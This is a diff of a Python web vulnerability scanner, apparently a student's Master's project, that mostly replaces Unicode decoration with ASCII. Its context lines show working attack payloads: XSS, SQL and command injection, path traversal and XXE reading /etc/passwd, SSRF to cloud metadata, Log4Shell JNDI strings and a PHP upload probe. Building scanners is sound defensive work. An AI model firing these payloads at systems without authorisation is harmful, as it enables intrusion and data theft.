@@ -1,33 +1,33 @@
 """
-═══════════════════════════════════════════════════════════════
-  CYBRAIN — Complete Vulnerability Scanner  (v2.0)
+===============================================================
+  CYBRAIN - Complete Vulnerability Scanner  (v2.0)
   OWASP Top 10 2025 + CWE/SANS Top 25 + Extended Checks
-  PFE Master 2 — Information Security
-  University of Mohamed Boudiaf, M'sila — Algeria
+  PFE Master 2 - Information Security
+  University of Mohamed Boudiaf, M'sila - Algeria
 
   COVERAGE
-  ────────
-  • SQL Injection      — error, union, boolean, time-based, auth bypass
-  • XSS               — reflected, DOM, stored, CSP bypass
-  • Command Injection  — Unix + Windows
-  • SSTI              — Jinja2, Twig, Freemarker, Velocity, Mako, Smarty
-  • Path Traversal/LFI — encoded, double-encoded, null byte
-  • XXE               — classic + blind OOB
-  • SSRF              — internal IPs, cloud metadata, DNS rebind
-  • IDOR / BAC
-  • Auth Failures      — default creds, JWT alg:none, weak sessions
-  • Security Misconfig — headers, 60+ sensitive files, CORS
-  • Crypto Failures    — HTTP, cookies, weak JWT
-  • CSRF
-  • Open Redirect
-  • HTTP Method Abuse  — TRACE, PUT, DELETE
-  • Clickjacking
-  • Host Header Injection
-  • Insecure Deserialization — signature-based detection
-  • Race Condition, Mass Assignment, Log4Shell, GraphQL (via url_scanner)
+  ????????
+  * SQL Injection      - error, union, boolean, time-based, auth bypass
+  * XSS               - reflected, DOM, stored, CSP bypass
+  * Command Injection  - Unix + Windows
+  * SSTI              - Jinja2, Twig, Freemarker, Velocity, Mako, Smarty
+  * Path Traversal/LFI - encoded, double-encoded, null byte
+  * XXE               - classic + blind OOB
+  * SSRF              - internal IPs, cloud metadata, DNS rebind
+  * IDOR / BAC
+  * Auth Failures      - default creds, JWT alg:none, weak sessions
+  * Security Misconfig - headers, 60+ sensitive files, CORS
+  * Crypto Failures    - HTTP, cookies, weak JWT
+  * CSRF
+  * Open Redirect
+  * HTTP Method Abuse  - TRACE, PUT, DELETE
+  * Clickjacking
+  * Host Header Injection
+  * Insecure Deserialization - signature-based detection
+  * Race Condition, Mass Assignment, Log4Shell, GraphQL (via url_scanner)
 
-  NO system commands · NO destructive payloads · EDUCATIONAL USE ONLY
-═══════════════════════════════════════════════════════════════
+  NO system commands ? NO destructive payloads ? EDUCATIONAL USE ONLY
+===============================================================
 """
 
 import requests
@@ -48,7 +48,7 @@ BROWSER_UA = (
     "Chrome/122.0.0.0 Safari/537.36"
 )
 
-# ── SQL error signatures ────────────────────────────────────────────────────
+# ?? SQL error signatures ????????????????????????????????????????????????????
 DB_ERRORS = [
     "sql syntax", "mysql_fetch", "mysql_num_rows", "sqlite",
     "ora-", "pg_query", "pg_exec", "microsoft ole db",
@@ -59,7 +59,7 @@ DB_ERRORS = [
     "mysqli_", "mssql_", "pg_connect", "mysql error", "database error",
 ]
 
-# ── XSS payloads ────────────────────────────────────────────────────────────
+# ?? XSS payloads ????????????????????????????????????????????????????????????
 XSS_PAYLOADS = [
     "<script>alert('xss_cybrain_2025')</script>",
     "<img src=x onerror=alert(1)>",
@@ -83,7 +83,7 @@ XSS_PAYLOADS = [
     "<script>document.write('<img src=x onerror=alert(1)>')</script>",
 ]
 
-# ── XSS DOM sinks to look for in source ────────────────────────────────────
+# ?? XSS DOM sinks to look for in source ????????????????????????????????????
 DOM_SINKS = [
     "document.write(", "document.writeln(",
     "innerHTML", "outerHTML", "insertAdjacentHTML",
@@ -99,7 +99,7 @@ DOM_SOURCES = [
     "document.baseURI",
 ]
 
-# ── SQLi payloads ────────────────────────────────────────────────────────────
+# ?? SQLi payloads ????????????????????????????????????????????????????????????
 SQLI_ERROR_PAYLOADS = [
     ("'",                       "Single quote"),
     ("''",                      "Double quote"),
@@ -127,7 +127,7 @@ SQLI_TIME_PAYLOADS = [
     ("1'||DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", 3.0, "Oracle pipe"),
 ]
 
-# ── Command injection ────────────────────────────────────────────────────────
+# ?? Command injection ????????????????????????????????????????????????????????
 CMD_PAYLOADS = [
     ("; id",             "Semicolon id"),
     ("| id",             "Pipe id"),
@@ -150,7 +150,7 @@ CMD_SIGNS = [
     "[extensions]", "[fonts]",
 ]
 
-# ── SSTI payloads — covers Jinja2, Twig, Freemarker, Velocity, Mako, Smarty
+# ?? SSTI payloads - covers Jinja2, Twig, Freemarker, Velocity, Mako, Smarty
 SSTI_PAYLOADS = {
     # Jinja2 / Mako
     "{{7*7}}":                        "49",
@@ -176,7 +176,7 @@ SSTI_PAYLOADS = {
     "*{7*7}":                        "49",
 }
 
-# ── Path traversal ────────────────────────────────────────────────────────────
+# ?? Path traversal ????????????????????????????????????????????????????????????
 PATH_TRAVERSAL = [
     # Classic
     "../../../etc/passwd",
@@ -204,7 +204,7 @@ TRAVERSAL_SIGNS = [
     "/etc/passwd", "[drivers]", "[fonts]",
 ]
 
-# ── XXE payloads ─────────────────────────────────────────────────────────────
+# ?? XXE payloads ?????????????????????????????????????????????????????????????
 XXE_CLASSIC = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
@@ -220,7 +220,7 @@ XXE_BLIND = """<?xml version="1.0" encoding="UTF-8"?>
 
 XXE_SIGNS = ["root:x:", "/bin/bash", "daemon:", "etc/passwd"]
 
-# ── SSRF payloads ─────────────────────────────────────────────────────────────
+# ?? SSRF payloads ?????????????????????????????????????????????????????????????
 SSRF_PAYLOADS = [
     # Internal IPs
     "http://127.0.0.1",
@@ -256,7 +256,7 @@ SSRF_PARAMS = [
     "host", "dest", "to", "next", "data",
 ]
 
-# ── Sensitive files (60+) ─────────────────────────────────────────────────────
+# ?? Sensitive files (60+) ?????????????????????????????????????????????????????
 SENSITIVE_FILES = {
     # Credentials / secrets
     "/.env":                  ("CRITICAL", "password|secret|key|db_"),
@@ -343,7 +343,7 @@ SENSITIVE_FILES = {
     "/.well-known/":          ("LOW",      ""),
 }
 
-# ── Insecure deserialization signatures ──────────────────────────────────────
+# ?? Insecure deserialization signatures ??????????????????????????????????????
 DESER_SIGNS = {
     # Java serialized object magic bytes (base64 encoded rO0)
     "java_serial":   (b"\xac\xed\x00\x05", "rO0AB"),
@@ -355,12 +355,12 @@ DESER_SIGNS = {
     "dotnet_viewstate": ("__VIEWSTATE", "/wEy"),
 }
 
-# ── Race condition test configuration ────────────────────────────────────────
+# ?? Race condition test configuration ????????????????????????????????????????
 RACE_ENDPOINTS = ["/login", "/api/login", "/signin", "/register", "/api/register", "/forgot-password"]
 RACE_CONCURRENT_REQUESTS = 20          # Number of concurrent requests to send
 RACE_SUCCESS_INDICATORS = ["welcome", "dashboard", "token", "success", "logged in"]
 
-# ── GraphQL endpoints and introspection query ────────────────────────────────
+# ?? GraphQL endpoints and introspection query ????????????????????????????????
 GRAPHQL_PATHS = [
     "/graphql", "/graphql/", "/api/graphql", "/v1/graphql", "/gql", "/query",
     "/api", "/api/v1", "/explorer", "/playground", "/console"
@@ -370,7 +370,7 @@ query { __schema { types { name fields { name } } } }
 """
 GRAPHQL_ERROR_SIGNS = ["graphql", "validation error", "syntax error", "bad request", "cannot query field"]
 
-# ── Log4Shell / Spring4Shell payloads ────────────────────────────────────────
+# ?? Log4Shell / Spring4Shell payloads ????????????????????????????????????????
 LOG4SHELL_PAYLOADS = [
     "${jndi:ldap://cybrain-log4shell-canary.com/a}",
     "${jndi:rmi://cybrain-log4shell-canary.com/a}",
@@ -388,7 +388,7 @@ LOG4SHELL_HEADERS = [
 LOG4SHELL_PARAMS = ["id", "name", "user", "username", "q", "search", "redirect", "url"]
 LOG4SHELL_SIGNS = ["jndi", "ldap", "rmi", "dns", "lookup", "error", "exception", "javax.naming"]
 
-# ── Mass Assignment test parameters ──────────────────────────────────────────
+# ?? Mass Assignment test parameters ??????????????????????????????????????????
 MASS_ASSIGN_PARAMS = [
     ("admin", "true"), ("role", "admin"), ("is_admin", "1"),
     ("privileged", "true"), ("access_level", "999"),
@@ -401,7 +401,7 @@ MASS_ASSIGN_PARAMS = [
 class OWASPChecker:
     """
     OWASP Top 10 2025 + CWE/SANS Top 25.
-    Pure technical detection — zero AI involvement.
+    Pure technical detection - zero AI involvement.
     """
 
     def __init__(self, target_url, session, timeout=12, fast_mode=True):
@@ -416,7 +416,7 @@ class OWASPChecker:
         self.discovered_params = set()
         self._lock = threading.Lock()
 
-    # ── Helpers ───────────────────────────────────────────────────────────
+    # ?? Helpers ???????????????????????????????????????????????????????????
 
     def _base(self, url):
         p = urlparse(url)
@@ -494,13 +494,13 @@ class OWASPChecker:
               f"{len(self.discovered_params)} params.")
 
         if any(s in html.lower() for s in ["bundle.js", "react.js", "app.js", "chunk.js"]):
-            print("[CYBRAIN] SPA detected — adding API endpoints.")
+            print("[CYBRAIN] SPA detected - adding API endpoints.")
             for ep in ["/api", "/v1", "/api/v1"]:
                 self.discovered_links.add(ep)
 
-    # ══════════════════════════════════════════════════════════════
+    # ==============================================================
     #  MAIN RUN
-    # ══════════════════════════════════════════════════════════════
+    # ==============================================================
 
     def run_all(self):
         print("[CYBRAIN] Starting full scan...")
@@ -558,9 +558,9 @@ class OWASPChecker:
         print(f"[CYBRAIN] Done. {len(self.findings)} findings.")
         return self.findings
 
-    # ════════════════════════════════════════════════
-    #  A01 — BROKEN ACCESS CONTROL
-    # ════════════════════════════════════════════════
+    # ================================================
+    #  A01 - BROKEN ACCESS CONTROL
+    # ================================================
     def _a01_broken_access_control(self, resp):
         print("[A01:2025] Broken Access Control...")
 
@@ -583,7 +583,7 @@ class OWASPChecker:
                         "A01:2025", "Broken Access Control", "HIGH",
                         "Insecure Direct Object Reference (IDOR)",
                         f"Endpoint {path} returns user PII without authorization.",
-                        evidence=f"GET {self.base}{path} → 200 + PII",
+                        evidence=f"GET {self.base}{path} -> 200 + PII",
                         fix=(
                             "1. Verify authenticated user owns the resource.\n"
                             "2. Use UUIDs instead of sequential IDs.\n"
@@ -611,7 +611,7 @@ class OWASPChecker:
                         "A01:2025", "Broken Access Control", "CRITICAL",
                         f"Admin Panel Accessible: {path}",
                         f"Admin panel at {path} accessible without authentication.",
-                        evidence=f"GET {self.base}{path} → 200 + admin content",
+                        evidence=f"GET {self.base}{path} -> 200 + admin content",
                         fix=(
                             "1. Require auth + admin role on all admin routes.\n"
                             "2. Implement IP allowlisting.\n"
@@ -652,7 +652,7 @@ class OWASPChecker:
                     "A01:2025", "Broken Access Control", "MEDIUM",
                     f"Forced Browsing: {path}",
                     f"Path {path} accessible without authorization.",
-                    evidence=f"GET {self.base}{path} → 200 ({len(r.text)} bytes)",
+                    evidence=f"GET {self.base}{path} -> 200 ({len(r.text)} bytes)",
                     fix="Restrict access; return 401/403 for unauthorized access.",
                     cwe="CWE-425", cvss="5.3"
                 )
@@ -665,16 +665,16 @@ class OWASPChecker:
                 self._add(
                     "A01:2025", "Broken Access Control", "MEDIUM",
                     f"HTTP Method Override ({hdr})",
-                    "Server accepts method override headers — WAF bypass possible.",
-                    evidence=f"{hdr}: DELETE → {r.status_code}",
+                    "Server accepts method override headers - WAF bypass possible.",
+                    evidence=f"{hdr}: DELETE -> {r.status_code}",
                     fix="Disable method override headers at framework level.",
                     cwe="CWE-650", cvss="6.5"
                 )
                 break
 
-    # ════════════════════════════════════════════════
-    #  A02 — SECURITY MISCONFIGURATION
-    # ════════════════════════════════════════════════
+    # ================================================
+    #  A02 - SECURITY MISCONFIGURATION
+    # ================================================
     def _a02_security_misconfiguration(self, resp):
         print("[A02:2025] Security Misconfiguration...")
 
@@ -692,11 +692,11 @@ class OWASPChecker:
         missing = [(h, s, c, d) for h, (s, c, d) in required.items() if h not in resp.headers]
         if missing:
             worst = "HIGH" if any(s == "HIGH" for _, s, _, _ in missing) else "MEDIUM"
-            header_list = "\n• ".join(f"{h} [{s}] — {d}" for h, s, _, d in missing)
+            header_list = "\n* ".join(f"{h} [{s}] - {d}" for h, s, _, d in missing)
             self._add(
                 "A02:2025", "Security Misconfiguration", worst,
                 "Missing HTTP Security Headers",
-                f"Missing headers:\n• {header_list}",
+                f"Missing headers:\n* {header_list}",
                 fix=(
                     'Header always set Content-Security-Policy "default-src \'self\'"\n'
                     'Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"\n'
@@ -718,7 +718,7 @@ class OWASPChecker:
                     cwe="CWE-200", cvss="5.3"
                 )
 
-        # Sensitive files — parallel
+        # Sensitive files - parallel
         def _check_file(args):
             path, (sev, kw) = args
             try:
@@ -745,7 +745,7 @@ class OWASPChecker:
                         "A02:2025", "Security Misconfiguration", result["sev"],
                         f"Sensitive File Exposed: {result['path']}",
                         f"Path {self.base}{result['path']} publicly accessible (HTTP 200).",
-                        evidence=f"GET {self.base}{result['path']} → 200 ({result['size']} bytes)",
+                        evidence=f"GET {self.base}{result['path']} -> 200 ({result['size']} bytes)",
                         fix=(
                             f"Remove {result['path']} from web root.\n"
                             "<Files .env>\n  Require all denied\n</Files>"
@@ -785,9 +785,9 @@ class OWASPChecker:
                 cwe="CWE-942", cvss="8.1"
             )
 
-    # ════════════════════════════════════════════════
-    #  A03 — SOFTWARE SUPPLY CHAIN
-    # ════════════════════════════════════════════════
+    # ================================================
+    #  A03 - SOFTWARE SUPPLY CHAIN
+    # ================================================
     def _a03_supply_chain(self, resp):
         print("[A03:2025] Software Supply Chain...")
 
@@ -852,9 +852,9 @@ class OWASPChecker:
                         cwe="CWE-353", cvss="6.8"
                     )
 
-    # ════════════════════════════════════════════════
-    #  A04 — CRYPTOGRAPHIC FAILURES
-    # ════════════════════════════════════════════════
+    # ================================================
+    #  A04 - CRYPTOGRAPHIC FAILURES
+    # ================================================
     def _a04_cryptographic_failures(self, resp):
         print("[A04:2025] Cryptographic Failures...")
 
@@ -863,11 +863,11 @@ class OWASPChecker:
             self._add(
                 "A04:2025", "Cryptographic Failures", "HIGH",
                 "Unencrypted HTTP Protocol",
-                "Site served over HTTP. All data in plaintext — MITM risk.",
+                "Site served over HTTP. All data in plaintext - MITM risk.",
                 evidence="Protocol: HTTP (no TLS/SSL)",
                 fix=(
                     "1. Get free TLS cert: certbot --apache\n"
-                    "2. Redirect HTTP→HTTPS\n"
+                    "2. Redirect HTTP->HTTPS\n"
                     "3. Add HSTS header"
                 ),
                 cwe="CWE-319", cvss="7.5"
@@ -878,16 +878,16 @@ class OWASPChecker:
         if raw_cookie:
             issues = []
             if "httponly" not in raw_cookie.lower():
-                issues.append("HttpOnly missing — JS can steal cookie")
+                issues.append("HttpOnly missing - JS can steal cookie")
             if "secure" not in raw_cookie.lower():
-                issues.append("Secure missing — sent over plain HTTP")
+                issues.append("Secure missing - sent over plain HTTP")
             if "samesite" not in raw_cookie.lower():
-                issues.append("SameSite missing — CSRF possible")
+                issues.append("SameSite missing - CSRF possible")
             if issues:
                 self._add(
                     "A04:2025", "Cryptographic Failures", "HIGH",
                     "Insecure Cookie Configuration",
-                    "Session cookies missing security flags:\n• " + "\n• ".join(issues),
+                    "Session cookies missing security flags:\n* " + "\n* ".join(issues),
                     evidence=f"Set-Cookie: {raw_cookie[:150]}",
                     fix="Set-Cookie: session=VALUE; HttpOnly; Secure; SameSite=Strict",
                     cwe="CWE-1004", cvss="7.3"
@@ -908,8 +908,8 @@ class OWASPChecker:
                 if alg.lower() == "none":
                     self._add(
                         "A04:2025", "Cryptographic Failures", "CRITICAL",
-                        "JWT Algorithm:None — Signature Bypass",
-                        "JWT with alg:none — signature verification disabled. "
+                        "JWT Algorithm:None - Signature Bypass",
+                        "JWT with alg:none - signature verification disabled. "
                         "Attacker can forge admin tokens.",
                         evidence=f"JWT header: {hdr}",
                         fix=(
@@ -940,16 +940,16 @@ class OWASPChecker:
                 self._add(
                     "A04:2025", "Cryptographic Failures", "HIGH",
                     f"Sensitive Data in URL ({p})",
-                    f"Parameter '{p}' in URL — logged in server logs and browser history.",
+                    f"Parameter '{p}' in URL - logged in server logs and browser history.",
                     evidence=f"URL contains: {p}=...",
                     fix="Never pass sensitive data in URL params. Use POST body + HTTPS.",
                     cwe="CWE-312", cvss="7.5"
                 )
                 break
 
-    # ════════════════════════════════════════════════
-    #  A05 — INJECTION (SQLi / XSS / Cmd / SSTI)
-    # ════════════════════════════════════════════════
+    # ================================================
+    #  A05 - INJECTION (SQLi / XSS / Cmd / SSTI)
+    # ================================================
     def _a05_injection(self, resp):
         print("[A05:2025] Injection...")
 
@@ -959,7 +959,7 @@ class OWASPChecker:
             "order", "sort", "filter", "key", "name",
         ]) | self.discovered_params)
 
-        # ── SQL Injection (error-based) ──────────────────────────
+        # ?? SQL Injection (error-based) ??????????????????????????
         found_sqli = False
         for form in self.discovered_forms:
             if found_sqli: break
@@ -978,9 +978,9 @@ class OWASPChecker:
                         if r and any(e in r.text.lower() for e in DB_ERRORS):
                             self._add(
                                 "A05:2025", "Injection", "CRITICAL",
-                                f"SQL Injection (POST) — {form['action']}",
+                                f"SQL Injection (POST) - {form['action']}",
                                 f"SQLi via POST param '{param}' at {form['action']}.",
-                                evidence=f"POST {form['action']} | {param}={payload} → DB Error",
+                                evidence=f"POST {form['action']} | {param}={payload} -> DB Error",
                                 fix="Use parameterized queries. Never concatenate user input into SQL.",
                                 cwe="CWE-89", cvss="9.8", sans="SANS #3"
                             )
@@ -998,7 +998,7 @@ class OWASPChecker:
                         "SQL Injection (Error-Based)",
                         f"SQLi via '{param}'. DB error in response. "
                         "Full DB extraction and auth bypass possible.",
-                        evidence=f"?{param}={payload} → DB error",
+                        evidence=f"?{param}={payload} -> DB error",
                         fix=(
                             "1. Use parameterized queries:\n"
                             "   cursor.execute('SELECT * FROM t WHERE id=?', (uid,))\n"
@@ -1030,16 +1030,16 @@ class OWASPChecker:
                         ]):
                             self._add(
                                 "A05:2025", "Injection", "CRITICAL",
-                                "SQL Injection — Auth Bypass",
+                                "SQL Injection - Auth Bypass",
                                 f"Login at {path} bypassed via SQLi.",
-                                evidence=f"POST {path} → 200 + auth token",
+                                evidence=f"POST {path} -> 200 + auth token",
                                 fix="Parameterized queries. Hash passwords with bcrypt/argon2.",
                                 cwe="CWE-89", cvss="9.8", sans="SANS #3"
                             )
                             found_sqli = True
                             break
 
-        # ── Reflected XSS ───────────────────────────────────────
+        # ?? Reflected XSS ???????????????????????????????????????
         xss_paths = [
             "/search", "/", "/index.php", "/query",
             "/find", "/results", "/q", "/s",
@@ -1057,7 +1057,7 @@ class OWASPChecker:
                     self._add(
                         "A05:2025", "Injection", "HIGH",
                         "Reflected Cross-Site Scripting (XSS)",
-                        f"XSS at {path} — input reflected unencoded. "
+                        f"XSS at {path} - input reflected unencoded. "
                         "Cookie theft, session hijacking, malware delivery.",
                         evidence=f"Path: {path} | Payload reflected: {payload[:60]}",
                         fix=(
@@ -1072,7 +1072,7 @@ class OWASPChecker:
                     found_xss = True
                     break
 
-        # ── Command Injection ───────────────────────────────────
+        # ?? Command Injection ???????????????????????????????????
         cmd_params = [
             "host", "ip", "cmd", "exec", "ping", "query",
             "file", "path", "dir", "command", "run", "shell",
@@ -1087,7 +1087,7 @@ class OWASPChecker:
                         "A05:2025", "Injection", "CRITICAL",
                         "OS Command Injection",
                         f"Command injection via '{param}'. OS output in response.",
-                        evidence=f"?{param}={payload} → command output",
+                        evidence=f"?{param}={payload} -> command output",
                         fix=(
                             "NEVER pass user input to OS commands.\n"
                             "Use subprocess with shell=False.\n"
@@ -1099,7 +1099,7 @@ class OWASPChecker:
                     break
             if found: break
 
-        # ── SSTI ────────────────────────────────────────────────
+        # ?? SSTI ????????????????????????????????????????????????
         try:
             baseline = self.session.get(self.target, timeout=8).text
             ssti_unreliable = "49" in baseline
@@ -1116,7 +1116,7 @@ class OWASPChecker:
                         "Server-Side Template Injection (SSTI)",
                         f"Template expression evaluated server-side. "
                         f"RCE achievable in Jinja2/Twig/Freemarker/Smarty/Mako/Velocity.",
-                        evidence=f"Payload: {payload} → Result: {expected}",
+                        evidence=f"Payload: {payload} -> Result: {expected}",
                         fix=(
                             "Never render user input as template code.\n"
                             "Use sandboxed template environments.\n"
@@ -1126,7 +1126,7 @@ class OWASPChecker:
                     )
                     break
 
-        # ── LDAP Injection ──────────────────────────────────────
+        # ?? LDAP Injection ??????????????????????????????????????
         ldap_payloads = ["*)(uid=*))(|(uid=*", "*()|%26'", "admin)(&)"]
         ldap_errors   = ["ldap", "javax.naming", "ldapexception", "invalid dn"]
         for payload in ldap_payloads:
@@ -1138,15 +1138,15 @@ class OWASPChecker:
                         "A05:2025", "Injection", "HIGH",
                         "LDAP Injection",
                         f"LDAP injection via '{param}'. Directory auth bypass possible.",
-                        evidence=f"?{param}={payload} → LDAP error",
+                        evidence=f"?{param}={payload} -> LDAP error",
                         fix="Escape LDAP special chars: ( ) * \\ NUL / @ = + < > , ;",
                         cwe="CWE-90", cvss="8.1"
                     )
                     break
 
-    # ════════════════════════════════════════════════
-    #  A06 — INSECURE DESIGN
-    # ════════════════════════════════════════════════
+    # ================================================
+    #  A06 - INSECURE DESIGN
+    # ================================================
     def _a06_insecure_design(self, resp):
         print("[A06:2025] Insecure Design...")
 
@@ -1172,9 +1172,9 @@ class OWASPChecker:
             if not blocked:
                 self._add(
                     "A06:2025", "Insecure Design", "HIGH",
-                    "No Rate Limiting — Brute Force Risk",
+                    "No Rate Limiting - Brute Force Risk",
                     f"Login {login_path}: 12 consecutive failures not blocked.",
-                    evidence=f"12 requests to {login_path} — no HTTP 429",
+                    evidence=f"12 requests to {login_path} - no HTTP 429",
                     fix=(
                         "1. Rate limit: max 5 attempts/min.\n"
                         "2. Account lockout after N failures.\n"
@@ -1200,9 +1200,9 @@ class OWASPChecker:
                 )
                 break
 
-    # ════════════════════════════════════════════════
-    #  A07 — AUTHENTICATION FAILURES
-    # ════════════════════════════════════════════════
+    # ================================================
+    #  A07 - AUTHENTICATION FAILURES
+    # ================================================
     def _a07_auth_failures(self, resp):
         print("[A07:2025] Authentication Failures...")
 
@@ -1252,7 +1252,7 @@ class OWASPChecker:
                         "A07:2025", "Authentication Failures", "CRITICAL",
                         "Default Credentials Accepted",
                         f"Application accepted {uname}:{passwd} at {path}.",
-                        evidence=f"POST {path} {uname}:{passwd} → 200",
+                        evidence=f"POST {path} {uname}:{passwd} -> 200",
                         fix="Remove default credentials. Enforce strong password policy. Add MFA.",
                         cwe="CWE-521", cvss="9.8"
                     )
@@ -1273,9 +1273,9 @@ class OWASPChecker:
                         cvss="7.5"
                     )
 
-    # ════════════════════════════════════════════════
-    #  A08 — INTEGRITY FAILURES
-    # ════════════════════════════════════════════════
+    # ================================================
+    #  A08 - INTEGRITY FAILURES
+    # ================================================
     def _a08_integrity_failures(self, resp):
         print("[A08:2025] Integrity Failures...")
 
@@ -1298,9 +1298,9 @@ class OWASPChecker:
                     cwe="CWE-502", cvss="9.8", sans="SANS #24"
                 )
 
-    # ════════════════════════════════════════════════
-    #  A09 — LOGGING FAILURES
-    # ════════════════════════════════════════════════
+    # ================================================
+    #  A09 - LOGGING FAILURES
+    # ================================================
     def _a09_logging_failures(self, resp):
         print("[A09:2025] Logging/Monitoring...")
 
@@ -1338,14 +1338,14 @@ class OWASPChecker:
                         "A09:2025", "Security Logging and Alerting Failures", "HIGH",
                         f"Log File Exposed: {path}",
                         f"Log at {path} publicly accessible. May contain credentials.",
-                        evidence=f"GET {self.base}{path} → 200 ({len(r.text)}b)",
+                        evidence=f"GET {self.base}{path} -> 200 ({len(r.text)}b)",
                         fix="Move logs outside web root. Block via .htaccess.",
                         cwe="CWE-532", cvss="7.5"
                     )
 
-    # ════════════════════════════════════════════════
-    #  A10 — MISHANDLING EXCEPTIONS / SSRF
-    # ════════════════════════════════════════════════
+    # ================================================
+    #  A10 - MISHANDLING EXCEPTIONS / SSRF
+    # ================================================
     def _a10_mishandling_exceptions(self, resp):
         print("[A10:2025] Exception Handling + SSRF...")
 
@@ -1380,13 +1380,13 @@ class OWASPChecker:
                         "A10:2025", "Mishandling of Exceptional Conditions", "MEDIUM",
                         "Unhandled Exception Exposed",
                         "Application returns unhandled exception details.",
-                        evidence=f"Input: {str(result)[:30]} → HTTP 500",
+                        evidence=f"Input: {str(result)[:30]} -> HTTP 500",
                         fix="Implement global exception handlers. Log server-side only.",
                         cwe="CWE-755", cvss="5.3"
                     )
                     break
 
-        # SSRF — core
+        # SSRF - core
         for param in SSRF_PARAMS[:8]:
             for payload in SSRF_PAYLOADS[:4]:
                 url = self._build_url(params={param: payload})
@@ -1396,7 +1396,7 @@ class OWASPChecker:
                         "A10:2025", "Mishandling of Exceptional Conditions", "CRITICAL",
                         "Server-Side Request Forgery (SSRF)",
                         f"SSRF via '{param}'. Internal network accessible.",
-                        evidence=f"?{param}={payload} → internal data",
+                        evidence=f"?{param}={payload} -> internal data",
                         fix=(
                             "Validate URLs against allowlist.\n"
                             "Block private IP ranges at network level.\n"
@@ -1406,12 +1406,12 @@ class OWASPChecker:
                     )
                     return
 
-    # ════════════════════════════════════════════════
+    # ================================================
     #  CWE / SANS EXTRAS
-    # ════════════════════════════════════════════════
+    # ================================================
 
     def _cwe_path_traversal(self):
-        """CWE-22: Path Traversal / LFI — encoded, double-encoded, null byte."""
+        """CWE-22: Path Traversal / LFI - encoded, double-encoded, null byte."""
         print("[CWE-22] Path Traversal/LFI...")
         params = ["file","path","page","include","template","view","doc","load"]
         for payload in PATH_TRAVERSAL:
@@ -1424,7 +1424,7 @@ class OWASPChecker:
                         "Path Traversal / LFI (CWE-22)",
                         f"Path traversal via '{param}' ({payload[:40]}). "
                         "Filesystem content returned.",
-                        evidence=f"?{param}={payload} → file content",
+                        evidence=f"?{param}={payload} -> file content",
                         fix=(
                             "Validate paths against strict allowlist.\n"
                             "Use chroot/jail for web process.\n"
@@ -1435,7 +1435,7 @@ class OWASPChecker:
                     return
 
     def _cwe_xxe(self):
-        """CWE-611: XXE — classic + blind OOB."""
+        """CWE-611: XXE - classic + blind OOB."""
         print("[CWE-611] XXE...")
         xml_endpoints = [
             "/api/xml","/xml","/upload","/import","/parse",
@@ -1449,9 +1449,9 @@ class OWASPChecker:
             if r and r.status_code == 200 and any(s in r.text for s in XXE_SIGNS):
                 self._add(
                     "A05:2025", "Injection", "CRITICAL",
-                    "XML External Entity (XXE) — Classic",
+                    "XML External Entity (XXE) - Classic",
                     f"XXE at {path}. File contents returned in response.",
-                    evidence=f"POST {path} XXE payload → /etc/passwd",
+                    evidence=f"POST {path} XXE payload -> /etc/passwd",
                     fix=(
                         "Disable external entities:\n"
                         "lxml: etree.XMLParser(resolve_entities=False)\n"
@@ -1461,17 +1461,17 @@ class OWASPChecker:
                 )
                 return
 
-            # Blind XXE — check for DNS callback indicator in error
+            # Blind XXE - check for DNS callback indicator in error
             r2 = self._post(f"{self.base}{path}", data=XXE_BLIND.encode(), headers=headers)
             if r2 and r2.status_code in (200, 400, 500):
                 body = r2.text.lower()
                 if any(s in body for s in ["xml","entity","dtd","parse error"]):
                     self._add(
                         "A05:2025", "Injection", "HIGH",
-                        "XML External Entity (XXE) — Blind OOB",
+                        "XML External Entity (XXE) - Blind OOB",
                         f"XML endpoint at {path} processes external entities "
                         "(error indicators present). Blind OOB data exfiltration possible.",
-                        evidence=f"POST {path} blind XXE → XML processing indicator",
+                        evidence=f"POST {path} blind XXE -> XML processing indicator",
                         fix=(
                             "Disable external entity processing entirely.\n"
                             "Use JSON instead of XML where possible."
@@ -1497,7 +1497,7 @@ class OWASPChecker:
                     "A01:2025", "Broken Access Control", "MEDIUM",
                     "Open Redirect (CWE-601)",
                     f"Parameter '{param}' redirects to arbitrary external URL.",
-                    evidence=f"?{param}={evil} → {r.url}",
+                    evidence=f"?{param}={evil} -> {r.url}",
                     fix=(
                         "Validate redirect URLs against allowlist.\n"
                         "Use relative URLs or internal mapping table only."
@@ -1534,7 +1534,7 @@ class OWASPChecker:
                     "A02:2025", "Security Misconfiguration", "HIGH",
                     "Host Header Injection",
                     "Attacker-controlled Host header reflected. Password reset poisoning possible.",
-                    evidence="Host: evil-cybrain-test.com → reflected in response",
+                    evidence="Host: evil-cybrain-test.com -> reflected in response",
                     fix=(
                         "Validate Host header against allowed hosts list.\n"
                         "Explicit server_name in Nginx / ServerName in Apache."
@@ -1545,7 +1545,7 @@ class OWASPChecker:
             pass
 
     def _cwe_http_methods(self):
-        """Dangerous HTTP methods — TRACE, PUT, DELETE."""
+        """Dangerous HTTP methods - TRACE, PUT, DELETE."""
         print("[CWE-16] HTTP Methods...")
         try:
             r = self.session.options(
@@ -1561,8 +1561,8 @@ class OWASPChecker:
                     "A02:2025", "Security Misconfiguration", "MEDIUM",
                     f"Dangerous HTTP Methods: {', '.join(dangerous)}",
                     f"Methods {', '.join(dangerous)} enabled. "
-                    "TRACE → XST attack. PUT/DELETE → file manipulation.",
-                    evidence=f"OPTIONS → Allow: {allowed}",
+                    "TRACE -> XST attack. PUT/DELETE -> file manipulation.",
+                    evidence=f"OPTIONS -> Allow: {allowed}",
                     fix="LimitExcept GET POST { Require all denied }  |  TraceEnable Off",
                     cwe="CWE-16", cvss="5.8"
                 )
@@ -1591,7 +1591,7 @@ class OWASPChecker:
                                 "A02:2025", "Security Misconfiguration", "CRITICAL",
                                 "Unrestricted File Upload (CWE-434)",
                                 f"Upload at {path} accepted .php file. RCE via web shell possible.",
-                                evidence=f"POST {path} .php → {r2.status_code}",
+                                evidence=f"POST {path} .php -> {r2.status_code}",
                                 fix=(
                                     "Whitelist file extensions.\n"
                                     "Check MIME type server-side.\n"
@@ -1605,7 +1605,7 @@ class OWASPChecker:
                     pass
 
     def _cwe_insecure_deserialization(self, resp):
-        """CWE-502: Insecure Deserialization — signature-based detection."""
+        """CWE-502: Insecure Deserialization - signature-based detection."""
         print("[CWE-502] Insecure Deserialization...")
 
         # Check response body for serialized object magic bytes
